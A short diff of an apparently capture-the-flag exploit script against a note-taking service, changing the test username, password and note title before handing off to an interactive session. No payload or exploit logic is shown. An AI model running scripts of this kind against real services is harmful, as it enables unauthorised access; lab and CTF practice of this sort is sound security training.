@@ -291,13 +291,13 @@ def edit_note(title):
 def exploit(r):
   r.recvuntil('3) Exit\n')
 
-  user = 'uafioas'
-  pswd = 'uafioas'
+  user = 'uafio'
+  pswd = 'uafio'
 
   register(user, pswd)
   login(user, pswd)
-  create_note('ab')
-  edit_note('ab')
+  create_note('a')
+  edit_note('a')
 
   r.interactive()
 
